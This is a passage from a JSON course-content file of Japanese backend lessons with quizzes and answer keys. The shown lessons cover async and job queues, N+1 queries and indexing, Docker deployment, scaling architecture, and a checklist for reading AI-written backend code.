では\n\n```javascript\nimport request from \"supertest\";\nimport { app } from \"./app.js\";\n\ntest(\"タスクを作れる\", async () => {\n  const res = await request(app).post(\"/tasks\").send({ title: \"会場を探す\" });\n  expect(res.status).toBe(201);\n});\n```\n\n`supertest` が TestClient にあたり、`expect(...).toBe(...)` が `assert ... == ...` にあたります。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`app.dependency_overrides[get_db] = override_get_db` の目的は？",
        "choices": [
         "テストの間だけ、データベースを使い捨てのものに差し替える",
         "本番のデータベースを速くする",
         "get_db を削除する"
        ],
        "answer": 0,
        "explain": "Depends で受け取る部品は、テストで差し替えられます。"
       },
       {
        "question": "API のテストで特に入れておきたいのは？",
        "choices": [
         "正しいデータで作れることだけ",
         "他人のデータを取得・削除できないこと（認可）も",
         "画面のデザインの確認"
        ],
        "answer": 1,
        "explain": "断るべきものを断れるかのテストは、セキュリティの守りになります。"
       },
       {
        "question": "`@pytest.fixture` の中の `yield` の役割は？",
        "choices": [
         "そこでテストを実行し、終わったら後片付けを続ける",
         "値を 2 回返す",
         "テストを飛ばす"
        ],
        "answer": 0,
        "explain": "準備 → テスト → 後片付け、を 1 つの関数で書けます。"
       }
      ]
     ],
     "id": "12-testing-api"
    },
    {
     "title": "非同期処理と、裏で動く仕事（ジョブ）",
     "level": 3,
     "minutes": 18,
     "concepts": [
      "async",
      "backend",
      "deploy"
     ],
     "summary": "待ち時間を有効に使う async と、レスポンスのあとで動かす処理・定時に動かす処理・キュー。",
     "body": "## このレッスンのゴール\n\n- バックエンドで async が役立つ場面を説明できる\n- 「すぐ返して、重い仕事は裏で」という考え方が分かる\n- バックグラウンドタスク・ジョブキュー・定時実行（cron）を見分けられる\n\n## バックエンドは「待ち時間」だらけ\n\n1 つのリクエストの中で、サーバーは意外と **待って** ばかりいます。\n\n```text\nリクエストが来る\n → データベースに聞く        （待つ 5ms）\n → 外部の API に聞く         （待つ 300ms）\n → 計算する                  （0.1ms）\n → 返す\n```\n\n待っている間、何もしないのはもったいないので、**待っている間に別のリクエストの処理を進める** のが async です（Python コース Lv4「デコレータと async/await」）。\n\n```python\nimport httpx\n\n@app.get(\"/weather\")\nasync def weather():\n    async with httpx.AsyncClient() as client:\n        res = await client.get(\"https://api.example.com/forecast\", timeout=10)\n    return res.json()\n```\n\n- `async def`：途中で待つかもしれない関数\n- `await`：ここで待つ。待っている間、サーバーは他のリクエストを処理できる\n- `httpx` の `AsyncClient`：`requests` の async 版\n\n### ⚠️ async の落とし穴\n\n```python\n@app.get(\"/slow\")\nasync def slow():\n    time.sleep(3)             # ❌ async の中で「待たせない書き方」の待ち → サーバー全体が 3 秒止まる\n    requests.get(url)         # ❌ これも同じ\n```\n\n`async def` の中で、`time.sleep` や `requests` のような **普通の（同期の）待ち** を使うと、他のリクエストまで止まってしまいます。\n\nFastAPI では、\n\n- `async` 対応のライブラリ（httpx の AsyncClient など）を使うなら → `async def`\n- 普通のライブラリ（requests・sqlite3 など）を使うなら → **普通の `def`**（FastAPI が別のスレッドで動かしてくれる）\n\nと使い分けるのが安全です。AI のコードで `async def` の中に `requests.get` を見つけたら、確認ポイントです。\n\n## すぐ返して、重い仕事は裏で\n\n「タスクを作ったら、メンバー全員にメールで知らせる」場合、メールを 10 通送り終わるまで利用者を待たせるのはよくありません。\n\n```python\nfrom fastapi import BackgroundTasks\n\ndef send_notification(title: str):\n    ...  # メールを送る（数秒かかる）\n\n@app.post(\"/tasks\", status_code=201)\ndef create_task(body: TaskCreate, background: BackgroundTasks, db = Depends(get_db)):\n    task_id = save_task(db, body)\n    background.add_task(send_notification, body.title)   # ← レスポンスのあとで実行\n    return {\"id\": task_id, \"title\": body.title}\n```\n\n`BackgroundTasks` は、**レスポンスを返したあとに** 仕事を実行します（レッスン 12 のテストで、通知が実行されることも確認しました）。利用者はすぐに「作成しました」を受け取れます。\n\nただし、サーバーが再起動すると消えてしまうので、**数秒で終わる・失敗しても困らない仕事** 向けです。\n\n## 大事な仕事はジョブキューへ\n\n「動画の変換」「1 万人へのメール」「決済の後処理」のように、**時間がかかる・絶対に失敗させたくない** 仕事は、**ジョブキュー** を使います。\n\n```text\nAPI サーバー ──「この仕事をお願い」──▶ キュー（行列）──▶ ワーカー（仕事専用のプログラム）\n     │                                   （Redis など）          失敗したらやり直す\n     └─ すぐに「受け付けました」と返す\n```\n\n| 道具 | 言語・環境 |\n|---|---|\n| Celery、RQ、arq | Python |\n| BullMQ | Node.js |\n| Cloud Tasks、SQS | クラウドのサービス |\n\nキューを使うと、仕事が多いときは **ワーカーを増やす**、失敗したら **自動でやり直す**、ができます。\n\n## 定時に動かす（cron）\n\n「毎朝 6:30 に」「毎晩 0 時に集計」のように、**時刻を決めて動かす** 仕事もバックエンドの大事な役割です。\nfashion_news がまさにこれで、GitHub Actions の `cron: \"30 21 * * *\"` で動いていました。\n\n| 方法 | 例 |\n|---|---|\n| サーバーの cron | Linux の `crontab` |\n| GitHub Actions の schedule | fashion_news |\n| クラウドのスケジューラ | Cloud Scheduler、EventBridge |\n\n## やり直しに強くする（べき等）\n\n裏の仕事は失敗してやり直すことがあるので、**2 回実行されても困らない** ように作るのが大事です（レッスン 3 の「べき等」）。\n\n- fashion_news は「同じタイトルのページが既にあれば作らない」「掲載済み URL を記録する」ことで、2 回動いても二重にならないようにしていました\n- 決済などでは、リクエストに **一意の ID（べき等キー）** を付け、「この ID はもう処理済み」なら何もしない、という作りにします\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "`async def` の API の中で `time.sleep(3)` を呼ぶと？",
        "choices": [
         "その API だけが 3 秒待つ",
         "サーバー全体が 3 秒止まり、他のリクエストも待たされる",
         "エラーになる"
        ],
        "answer": 1,
        "explain": "async の中では await asyncio.sleep(3) のように「譲る」待ち方をする必要があります。"
       },
       {
        "question": "「タスクを作ったら通知メールを送る」。利用者を待たせない方法は？",
        "choices": [
         "BackgroundTasks やジョブキューで、レスポンスのあとに送る",
         "メールを送り終えてからレスポンスを返す",
         "メールを送らない"
        ],
        "answer": 0,
        "explain": "すぐ返して、重い仕事は裏で、が定番です。"
       },
       {
        "question": "裏で動く仕事を「2 回実行されても困らない」ように作る理由は？",
        "choices": [
         "2 回実行すると速くなるから",
         "失敗してやり直すことがあり、二重に処理されると困るから",
         "1 回では動かないから"
        ],
        "answer": 1,
        "explain": "二重のメール・二重の決済を防ぐための考え方（べき等）です。"
       }
      ]
     ],
     "id": "13-async-jobs"
    },
    {
     "title": "速さの基本 ― N+1・インデックス・キャッシュ",
     "level": 4,
     "minutes": 20,
     "concepts": [
      "performance",
      "database",
      "backend"
     ],
     "summary": "バックエンドが遅くなる原因の大半を占める 3 つと、その直し方。実際に測った数字つき。",
     "body": "## このレッスンのゴール\n\n- N+1 問題を見つけて、直し方を説明できる\n- インデックスが何をしているか説明できる\n- キャッシュの使いどころと注意点が分かる\n- 「まず測る」を習慣にできる\n\n## まず測る\n\n「遅い気がする」で直し始めると、関係ない所をいじりがちです。\n\n- どの API が遅いか（ログに処理時間を出す。レッスン 10）\n- その API の中で、何に時間がかかっているか（データベース？ 外部 API？ 計算？）\n\nバックエンドが遅い原因は、多くの場合 **データベースへの問い合わせ** です。次の 2 つがその代表です。\n\n## ① N+1 問題\n\nタスク一覧を、担当者の名前つきで返す API を考えます（レッスン 8 のモデル）。\n\n```python\ntasks = session.scalars(select(Task)).all()          # ① タスクを全部取る：1 回\nreturn [{\"title\": t.title, \"assignee\": t.assignee.name} for t in tasks]\n                                                       # ② t.assignee のたびに 1 回ずつ問い合わせ\n```\n\n`t.assignee` は、**たどった瞬間にデータベースへ聞きに行く**（遅延読み込み）ので、タスクが 50 件あると、\n\n```text\n1 回（タスク一覧）＋ 50 回（担当者を 1 人ずつ）＝ 51 回\n```\n\nの問い合わせになります。これが **N+1 問題** です（実際に数えて 51 回でした）。件数が増えるほど、どんどん遅くなります。\n\n**直し方**：最初に「担当者もまとめて取ってきて」と頼みます。\n\n```python\nfrom sqlalchemy.orm import selectinload\n\ntasks = session.scalars(select(Task).options(selectinload(Task.assignee))).all()\n```\n\nこれで問い合わせは **2 回**（タスク一覧 ＋ 担当者をまとめて 1 回）になりました（実測）。\n\n| ORM | まとめて取る書き方 |\n|---|---|\n| SQLAlchemy | `selectinload(...)` / `joinedload(...)` |\n| Django | `select_related(...)` / `prefetch_related(...)` |\n| Prisma | `include: { assignee: true }` |\n| Rails | `includes(:assignee)` |\n\n**見つけ方**：開発中に SQL のログを出す（SQLAlchemy なら `create_engine(..., echo=True)`）。同じ形の SELECT がずらっと並んでいたら N+1 です。\n**AI のコードで、ループの中で関連データをたどっていたら要注意** です。\n\n## ② インデックスが無い\n\n```sql\nSELECT count(*) FROM tasks WHERE owner_id = ?\n```\n\nインデックスが無いと、データベースは **表を最初から最後まで全部見て** 探します。本の中から言葉を探すのに、1 ページ目から全部めくるようなものです。\n\n**インデックス** は本の **索引** です。「owner_id が 5 の行はここ」という一覧を別に作っておき、すぐに見つけられるようにします。\n\n```sql\nCREATE INDEX idx_tasks_owner ON tasks(owner_id);\n```\n\n100 万行のテーブルで実際に測ると、こうなりました（このパソコンでの例）。\n\n| | 調べ方（EXPLAIN の結果） | 1 回あたり |\n|---|---|---|\n| インデックス無し | `SCAN tasks`（全部見る） | 約 22 ms |\n| インデックスあり | `SEARCH tasks USING ... INDEX`（索引で探す） | 約 0.02 ms |\n\n**約 1,000 倍** 速くなりました。\n\n- **`WHERE`・`ORDER BY`・`JOIN` によく使う列** にインデックスを付ける\n- 主キーには最初から付いている\n- 付けすぎると、追加・更新のたびに索引の更新が必要になり、書き込みが遅くなる\n- `EXPLAIN`（PostgreSQL なら `EXPLAIN ANALYZE`）で、インデックスが使われているか確かめられる\n\n## ③ キャッシュ：同じ答えを使い回す\n\n「何度聞かれても、しばらくは同じ答え」のものは、**一度計算した結果をとっておいて使い回す** と速くなります。これがキャッシュです。\n\n| 置き場所 | 例 |\n|---|---|\n| ブラウザ | `Cache-Control: max-age=3600`（1 時間は再取得しない） |\n| CDN（世界中にある配信用サーバー） | 画像・CSS・JavaScript・公開ページ |\n| サーバーのメモリ・**Redis** | ランキング、外部 API の結果、重い集計 |\n\n```python\ndef get_weather(city: str):\n    cached = redis.get(f\"weather:{city}\")\n    if cached:\n        return json.loads(cached)                          # あればそれを返す\n    data = call_weather_api(city)                          # 無ければ取ってきて\n    redis.set(f\"weather:{city}\", json.dumps(data), ex=600) # 10 分とっておく\n    return data\n```\n\n### キャッシュの難しさ\n\n> コンピュータサイエンスで難しいことは 2 つだけ。キャッシュの無効化と、名前付けだ。（よく引用される言葉）\n\n- **古い情報が出る**：元のデータが変わったのに、キャッシュの古い答えが返る。**期限（`ex=600`）を必ず付ける**、更新したらキャッシュを消す\n- **人によって違うものをキャッシュしない**：ログインした人ごとのデータを全員共通のキャッシュに入れると、**他人の情報が見えてしまう** 事故になる\n\n## その他の定番\n\n| 対策 | 内容 |\n|---|---|\n| ページ分け | 一覧を全件返さない（レッスン 4） |\n| 必要な列だけ取る | `SELECT *` ではなく、使う列だけ |\n| 重い仕事は裏へ | レッスン 13 |\n| 接続の使い回し | データベースへの接続を毎回作らず、プール（ためておく仕組み）で使い回す。多くのフレームワークや ORM が自動でやってくれる |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "タスク 100 件を取って、ループの中で `task.assignee.name` をたどると、問い合わせは何回になりやすい？",
        "choices": [
         "1 回",
         "2 回",
         "101 回"
        ],
        "answer": 2,
        "explain": "一覧 1 回＋担当者を 1 件ずつ 100 回。N+1 問題です。selectinload などでまとめて取ります。"
       },
       {
        "question": "インデックスを付けると速くなるのはどんな問い合わせ？",
        "choices": [
         "その列で WHERE や ORDER BY をする問い合わせ",
         "すべての INSERT",
         "テーブルの削除"
        ],
        "answer": 0,
        "explain": "索引で目的の行をすぐ見つけられるようになります。書き込みは少し遅くなります。"
       },
       {
        "question": "キャッシュで特に避けるべきことは？",
        "choices": [
         "期限を付けること",
         "ログインした人ごとのデータを、全員共通のキャッシュに入れること",
         "外部 API の結果を入れること"
        ],
        "answer": 1,
        "explain": "他人の情報が見えてしまう事故につながります。"
       }
      ]
     ],
     "id": "14-performance"
    },
    {
     "title": "デプロイと本番環境",
     "level": 4,
     "minutes": 20,
     "concepts": [
      "deploy",
      "tooling",
      "security"
     ],
     "summary": "手元で動いたバックエンドを、インターネットに公開して動かし続けるまで。環境変数・Docker・ホスティングの種類・CI/CD。",
     "body": "## このレッスンのゴール\n\n- 開発環境と本番環境の違いを説明できる\n- Dockerfile を読んで、何をしているか分かる\n- ホスティングの種類（PaaS・サーバーレス・VPS・BaaS）を見分けられる\n- デプロイの前後に確認すべきことが分かる\n\n## 「手元で動いた」から「みんなが使える」へ\n\n`localhost:8000`（レッスン 2）は自分のパソコンの中だけ。みんなに使ってもらうには、**インターネットにつながったサーバーで動かす** 必要があります。これを **デプロイ**（配置）と呼びます。\n\n| | 開発環境 | 本番環境 |\n|---|---|---|\n| どこで | 自分のパソコン | クラウドのサーバー |\n| データベース | SQLite・使い捨て | PostgreSQL など・**本物のデータ** |\n| 秘密情報 | `.env` | クラウドのシークレット管理 |\n| エラー表示 | 詳しく出す | 利用者には最小限、詳細はログへ |\n| `--reload` | 付ける | 付けない |\n\n## 設定は環境変数で切り替える\n\n同じコードを、開発でも本番でも動かせるように、**違いは全部「環境変数」で渡します**（AI と開発するコース「秘密情報と環境変数」）。\n\n```python\nimport os\nDATABASE_URL = os.environ[\"DATABASE_URL\"]       # 開発：sqlite:///app.db  本番：postgresql://...\nSECRET_KEY = os.environ[\"SECRET_KEY\"]\nDEBUG = os.environ.get(\"DEBUG\") == \"1\"\n```\n\nコードの中に「本番ならこうする」と書き分けないのがコツです。\n\n## Docker：動く環境ごと箱に詰める\n\n「私のパソコンでは動いたのに、サーバーでは動かない」の多くは、Python のバージョンやライブラリの違いが原因です。\n**Docker** は、アプリと、それが動く環境（OS・Python・ライブラリ）を **1 つの箱（コンテナ）** に詰めて、どこでも同じように動かす道具です。\n\n```dockerfile\nFROM python:3.12-slim                         # ① 土台：Python 3.12 が入った小さな Linux\nWORKDIR /app                                  # ② 作業フォルダ\nCOPY requirements.txt .                       # ③ ライブラリの一覧を先にコピーして\nRUN pip install --no-cache-dir -r requirements.txt   #    インストール\nCOPY . .                                      # ④ アプリのコードをコピー\nCMD [\"uvicorn\", \"main:app\", \"--host\", \"0.0.0.0\", \"--port\", \"8000\"]   # ⑤ 起動コマンド\n```\n\n| 命令 | 意味 |\n|---|---|\n| `FROM` | どの箱を土台にするか |\n| `WORKDIR` | 以降の作業をするフォルダ |\n| `COPY` | パソコンのファイルを箱の中へ |\n| `RUN` | 箱を作るときに 1 回だけ実行するコマンド |\n| `CMD` | 箱を起動したときに実行するコマンド |\n\n- `--host 0.0.0.0`：箱の **外から** のアクセスを受け付ける（`127.0.0.1` だと箱の中からしか届かない）\n- ③ で先に requirements.txt だけコピーするのは、コードを変えただけのときに、インストールをやり直さずに済ませる工夫（Docker はステップごとに結果を覚えている）\n\n## ホスティングの種類\n\n| 種類 | 例 | 自分で面倒を見る範囲 | 向いている場面 |\n|---|---|---|---|\n| **BaaS** | Firebase、Supabase | ほぼ無し（ルールの設定くらい） | 小さなアプリ・試作（popup2027） |\n| **PaaS** | Render、Railway、Fly.io、Google Cloud Run | コード（や Docker）を渡すだけ | 個人〜中規模の Web API |\n| **サーバーレス関数** | AWS Lambda、Cloudflare Workers、Vercel Functions | 関数だけ | アクセスが少ない・波がある API |\n| **VPS / 仮想マシン** | EC2、さくらの VPS | OS の更新・セキュリティまで全部 | 細かく制御したい |\n\n**初めてなら、BaaS か PaaS がおすすめ** です。サーバーの OS の更新やセキュリティ対策を、サービス側が引き受けてくれます。\n\nサーバーレス関数の例として、Cloudflare Workers と、そこから使えるデータベース D1 をレッスン 19 で実際に動かします。\n\n## CI/CD：テストして、自動で出す\n\n```text\npush → テスト（CI、レッスン 12）→ 合格したら自動でデプロイ（CD）\n```\n\nGitHub Actions で「main に入ったらテストして、通ったら Cloud Run にデプロイ」のように組むのが一般的です。このサイトの「claude/ ブランチを自動で main に取り込む」仕組みも、CI/CD の一種です。\n\n## デプロイのチェックリスト\n\n| いつ | 確認すること |\n|---|---|\n| 前 | テストが通っている |\n| 前 | 環境変数・シークレットが本番に設定されている（**コードに入っていない**） |\n| 前 | **マイグレーション**（レッスン 8）でデータが消えないか。**バックアップ** を取った |\n| 前 | `DEBUG` が切れている |\n| 後 | 主要な API を実際に呼んで確かめる（ヘルスチェック用の `GET /health` を作っておくと便利） |\n| 後 | エラー監視・ログに異常が出ていない（レッスン 10） |\n| いざというとき | **前の版に戻す方法**（ロールバック）を知っている |\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "開発と本番で、データベースの接続先を切り替えるよい方法は？",
        "choices": [
         "コードの中で if 本番: と書き分ける",
         "環境変数 DATABASE_URL で渡す",
         "本番用のファイルを別に作ってコピーする"
        ],
        "answer": 1,
        "explain": "同じコードのまま、外から渡す設定だけを変えるのが基本です。"
       },
       {
        "question": "Dockerfile の `CMD` の役割は？",
        "choices": [
         "箱を作るときにライブラリをインストールする",
         "箱を起動したときに実行するコマンドを決める",
         "ファイルをコピーする"
        ],
        "answer": 1,
        "explain": "RUN は作るときに 1 回、CMD は起動するたびに実行されます。"
       },
       {
        "question": "デプロイ前に特に気をつけたいことは？",
        "choices": [
         "マイグレーションでデータが消えないか確認し、バックアップを取る",
         "コードのコメントを全部消す",
         "テストを消して速くする"
        ],
        "answer": 0,
        "explain": "本番のデータは取り返しがつかないので、必ず確認とバックアップを。"
       }
      ]
     ],
     "id": "15-deploy"
    },
    {
     "title": "設計とスケール ― 大きくなっても壊れない作り",
     "level": 4,
     "minutes": 20,
     "concepts": [
      "performance",
      "backend",
      "deploy"
     ],
     "summary": "ステートレス・水平スケール・層の分け方・モノリスとマイクロサービス。規模に合った作りを選ぶ考え方。",
     "body": "## このレッスンのゴール\n\n- 「ステートレスにする」と、なぜサーバーを増やせるのか説明できる\n- コードを層（ルーター・サービス・リポジトリ）に分ける理由が分かる\n- モノリスとマイクロサービスの違いと、選び方の考え方を説明できる\n\n## 利用者が増えたらどうする？\n\n| 方法 | 内容 | たとえ |\n|---|---|---|\n| **垂直スケール** | サーバーを強くする（CPU・メモリを増やす） | 料理人を腕のいい人に替える |\n| **水平スケール** | サーバーの台数を増やす | 料理人を何人も雇う |\n\n垂直スケールは簡単ですが、限界があります。大きなサービスは **水平スケール** で伸びていきます。\n\n```text\n               ┌─▶ サーバー A ─┐\n利用者 ─▶ ロードバランサー ─┼─▶ サーバー B ─┼─▶ データベース\n               └─▶ サーバー C ─┘\n```\n\n**ロードバランサー** が、届いたリクエストを空いているサーバーに振り分けます。\n\n## ステートレス：どのサーバーに来てもよい作り\n\n水平スケールの前提は、**どのサーバーにリクエストが来ても同じように処理できる** ことです。\n\n```python\n# ❌ サーバーのメモリにログイン状態やデータを持つ\nsessions = {}          # サーバー A で覚えても、次のリクエストがサーバー B に行くと「知らない人」\ntasks = {}             # レッスン 5 の辞書。サーバーごとに中身がバラバラになる\n```\n\n```text\n⭕ 状態はサーバーの外に置く\n  - データ          → データベース\n  - ログイン状態    → JWT（毎回持ってきてもらう）か、Redis などの共有の置き場所\n  - アップロードされたファイル → ファイル置き場（S3・Cloud Storage など）\n```\n\nサーバー自身は何も覚えていない（**ステートレス**）ので、台数を増やしても減らしても大丈夫になります。\nレッスン 3 の「HTTP は覚えていない」と同じ考え方を、サーバーにも当てはめるわけです。\n\n## コードを層に分ける\n\nAI が書く中〜大規模のバックエンドは、よくこういうフォルダ構成になっています。\n\n```text\napp/\n├── main.py            アプリの組み立て（ルーターの取り付け・設定）\n├── routers/           ① 窓口：HTTP の受け取りと返事（ステータス・検証）\n│   └── tasks.py\n├── services/          ② 業務のルール：「締め切りは本番より前」「完了したら通知」\n│   └── task_service.py\n├── repositories/      ③ データの出し入れ：SQL・ORM はここだけ\n│   └── task_repo.py\n├── models.py          テーブルの定義（ORM）\n└── schemas.py         入出力の型紙（Pydantic）\n```\n\n| 層 | 知っていること | 知らなくていいこと |\n|---|---|---|\n| ① ルーター | HTTP（URL・ステータス） | SQL |\n| ② サービス | 業務のルール | HTTP・SQL |\n| ③ リポジトリ | データベース | HTTP |\n\nこう分けると、\n\n- 「データベースを PostgreSQL から別のものに替える」→ ③ だけ直せばよい\n- 「同じルールを、API からも定時の処理（レッスン 13）からも使う」→ ② を呼べばよい\n- テストで ③ を偽物に差し替えて、② のルールだけを確かめられる\n\nfashion_news で「notion.py だけ取り替えれば LINE に送れる」、popup2027 で「store が保存先の違いを隠している」と話したのも、同じ **役割を分けて、境目をはっきりさせる** 考え方です。\n\n**AI のバックエンドを読むときは、まずこのフォルダ構成を見て、「どの層の話か」を意識すると迷子になりません**（レッスン 17）。\n\n## モノリスとマイクロサービス\n\n| | モノリス | マイクロサービス |\n|---|---|---|\n| 形 | 1 つのアプリにすべての機能 | 機能ごとに別々のアプリ（ユーザー・注文・決済…）が API で話す |\n| 良い点 | 作りやすい・テストしやすい・速い | 機能ごとに別のチームが別々に開発・デプロイ・スケールできる |\n| 悪い点 | 大きくなると、ちょっとした変更でも全体に影響しやすい | 通信の失敗・データの食い違い・運用の手間が一気に増える |\n| 向いている | **ほとんどの小〜中規模のサービス** | 何十人・何百人の開発者がいる大きな組織 |\n\n**最初はモノリスで、層をきれいに分けて作る** のが、今の多くの現場での定石です。「マイクロサービスにしましょう」と AI が提案してきたら、本当にその規模か考えましょう。\n\n## 規模に合った作りを選ぶ\n\n| 規模 | 例 | 作り |\n|---|---|---|\n| 自分・数人 | popup2027、fashion_news | BaaS（Firebase）や、GitHub Actions の定時処理で十分 |\n| 〜数千人 | 小さな Web サービス | PaaS ＋ モノリス ＋ PostgreSQL |\n| それ以上 | 大きなサービス | 水平スケール・キャッシュ・ジョブキュー・必要に応じてサービス分割 |\n\n**大は小を兼ねません**。小さなアプリに大きな仕組みを入れると、作るのも直すのも大変になります。AI は頼まれると立派な構成を作りがちなので、「今の規模にこれは必要？」と聞き返すのも大事な仕事です。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "サーバーを 3 台に増やしたら、ログインしたのに「ログインしていません」と言われることがある。原因として考えられるのは？",
        "choices": [
         "ログイン状態を各サーバーのメモリに持っていて、別のサーバーにリクエストが届いた",
         "ロードバランサーが無いから",
         "データベースが遅いから"
        ],
        "answer": 0,
        "explain": "状態をサーバーの外（JWT・Redis など）に置き、ステートレスにします。"
       },
       {
        "question": "「SQL を書いてよいのはリポジトリ層だけ」にしておくと、何がうれしい？",
        "choices": [
         "処理が必ず速くなる",
         "データベースを替えるときに、直す場所が 1 か所にまとまる",
         "SQL インジェクションが起きなくなる"
        ],
        "answer": 1,
        "explain": "役割を分けておくと、変更の影響が狭い範囲に収まります。"
       },
       {
        "question": "3 人で使う予定の小さなアプリを作るとき、まず選ぶのに合う作りは？",
        "choices": [
         "BaaS やモノリスなど、シンプルな構成",
         "機能ごとに 10 個のマイクロサービス",
         "サーバーを 100 台用意する"
        ],
        "answer": 0,
        "explain": "規模に合わない大きな構成は、作るのも直すのも大変になります。"
       }
      ]
     ],
     "id": "16-architecture"
    },
    {
     "title": "総まとめ ― AI が書いたバックエンドを読む手順",
     "level": 4,
     "minutes": 15,
     "concepts": [
      "reading",
      "backend",
      "security",
      "ai_coding"
     ],
     "summary": "このコースで学んだことを、知らないバックエンドのコードを読む「手順書」にまとめる。",
     "body": "## このレッスンのゴール\n\n- 知らないバックエンドのリポジトリを、決まった順番で読み始められる\n- 読みながら、品質と安全のチェックができる\n- AI に何を聞けば理解が深まるか分かる\n\n## 読む順番（8 ステップ）\n\nはじめての「コードを読む」コースの「5 つのコツ」を、バックエンド用に具体的にしたものです。\n\n### ① 全体の地図を見る\n\n- フォルダ構成（レッスン 16 の層：routers・services・repositories・models・schemas）\n- README（起動方法・必要な環境変数）\n- 依存ライブラリ（`requirements.txt` / `pyproject.toml` / `package.json`）→ FastAPI か Express か、どの ORM か\n\n### ② 入口を探す\n\n- Python：`app = FastAPI()` と `uvicorn` の起動コマンド\n- Node.js：`app.listen(...)`、`package.json` の `scripts`\n- Docker：`Dockerfile` の `CMD`（レッスン 15）\n\n### ③ API の一覧を作る\n\nルーティングのデコレータ（`@app.get` / `@router.post` / `app.get(...)`）を全部探して、表にします（レッスン 5）。\n\n| メソッド | パス | ログイン必要？ | 何をする |\n|---|---|---|---|\n| GET | /tasks | ✅ | 自分のタスク一覧 |\n| POST | /tasks | ✅ | タスク作成 |\n| ... | | | |\n\nFastAPI なら、起動して `/docs` を開くと、この表がほぼ自動で見られます。\n\n### ④ データの形を見る\n\n- テーブルの定義（ORM のモデル・マイグレーション）→ どんなデータを持つアプリか\n- 入出力の型紙（Pydantic・zod）→ 何を受け付けて、何を返すか\n\n**データの形が分かると、アプリの半分は分かった** と言えます。\n\n### ⑤ 1 つの API を、入口から出口までたどる\n\n一番大事な API（たとえば「タスクを作る」）を 1 つ選び、\n\n```text\nルーター → 検証 → 認証・認可 → サービス（業務のルール）→ リポジトリ（データベース）→ レスポンス\n```\n\nの順に、関数を 1 つずつ追いかけます。バックエンドの仕事の 6 ステップ（レッスン 1）がどこに書かれているかを探すイメージです。\n\n### ⑥ 設定と秘密を見る\n\n- 環境変数の一覧（`.env.example`・`settings.py`・`config.ts`）\n- 秘密がコードに直書きされていないか（レッスン 11 の ④）\n\n### ⑦ テストを読む\n\nテストは「この API はこう動くはず」という **動く仕様書** です（レッスン 12）。テストの名前だけでも、意図がかなり分かります。テストが無ければ、それ自体がチェックポイントです。\n\n### ⑧ チェックリストで点検する\n\nレッスン 11 の 10 項目に加えて：\n\n| 観点 | 見るところ |\n|---|---|\n| エラー | 想定内のエラーが正しいステータスで返るか。`except: pass` が無いか（レッスン 10） |\n| 速さ | ループの中で関連データをたどっていないか（N+1）、よく検索する列にインデックスがあるか（レッスン 14） |\n| 非同期 | `async def` の中で `requests` や `time.sleep` を使っていないか（レッスン 13） |\n| 規模 | 今の規模に対して、構成が大げさすぎないか（レッスン 16） |\n\n## AI への聞き方の例\n\n読んでいて分からないところは、遠慮なく AI に聞きましょう。聞き方で、返ってくる答えの質が変わります（AI と開発するコース「伝わる頼み方」）。\n\n> `POST /tasks` が呼ばれてから、データベースに保存されるまでに通る関数を、ファイル名つきで順番に並べて\n\n> この API で、ログインしていない人・他人のデータを触ろうとした人は、どこで止められる？\n\n> このプロジェクトで、本番環境に必要な環境変数を全部挙げて、それぞれ何に使われるか説明して\n\n> このコードを、N+1 問題・SQL インジェクション・認可漏れの観点でレビューして\n\n## 自分の言葉で説明してみる\n\n最後に、このサイトの目的に戻りましょう。読んだバックエンドについて、次の 5 つを 30 秒で話せれば合格です。\n\n1. **何をする** API か（誰が、何のために使う？）\n2. **どんなデータ** を持っているか（主なテーブル）\n3. **どうやって守っている** か（認証・認可の方法）\n4. **どこで動いている** か（ホスティング・定時処理）\n5. **気になる点** はどこか（チェックリストで見つけたこと）\n\n**読みたいバックエンドのリポジトリがあれば、「◯◯ リポジトリを解説して」と頼んでください。** このコースの観点で、ファイルごとの解説シリーズを作ります。\n\n<div class=\"quiz\" data-quiz=\"0\"></div>",
     "quizzes": [
      [
       {
        "question": "知らないバックエンドを読むとき、API の一覧を作るために最初に探すとよいのは？",
        "choices": [
         "@app.get や @router.post などのルーティングのデコレータ",
         "CSS ファイル",
         "テストの中の assert"
        ],
        "answer": 0,
        "explain": "ルーティングを全部集めると、その API で何ができるかの一覧になります。"
       },
       {
        "question": "「データの形が分かると半分分かる」で見るべきものは？",
        "choices": [
         "ログの出力",
         "ORM のモデルやマイグレーション、Pydantic の型紙",
         "Dockerfile"
        ],
        "answer": 1,
        "explain": "どんなデータを持ち、何を受け付けて返すかが、アプリの骨格です。"
       },
       {
        "question": "次のうち、読みながら必ず確認したい「認可」のポイントは？",
        "choices": [
         "関数名が英語かどうか",
         "データを取得・更新・削除するときに、その人のデータかを確かめているか",
         "コメントの量"
        ],
        "answer": 1,
        "explain": "認可漏れは AI のコードで抜けやすく、被害が大きいポイントです。"
       }
      ]
     ],
     "id": "17-reading-ai-backend"
    },
    {
     "title": "OAuth と OpenID Connect ― 「Microsoft でサインイン」の裏側",
     "level": 3,
     "minutes": 25,
     "concepts": [
      "auth",
      "security",
      "http_api"
     ],
     "summary": "パスワードを預からずに「ログイン」と「権限」を借りる仕組み。認可コードフロー・PKCE・アクセストークンと ID トークンを、Microsoft ID プラットフォームを例に。",
